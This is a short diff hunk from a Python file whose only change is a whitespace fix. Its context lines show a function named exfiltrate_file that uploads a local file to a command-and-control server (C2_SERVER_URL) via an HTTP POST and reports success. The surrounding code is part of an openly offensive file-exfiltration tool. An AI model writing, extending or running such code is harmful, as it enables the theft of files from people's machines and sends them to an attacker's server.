@@ -11,7 +11,7 @@ def exfiltrate_file(file_path):
     with open(file_path, 'rb') as file:
         files = {'file': (os.path.basename(file_path), file)}
         response = requests.post(C2_SERVER_URL, files=files)
-        
+
     if response.status_code == 200:
         print(f"File {file_path} successfully exfiltrated.")
     else:
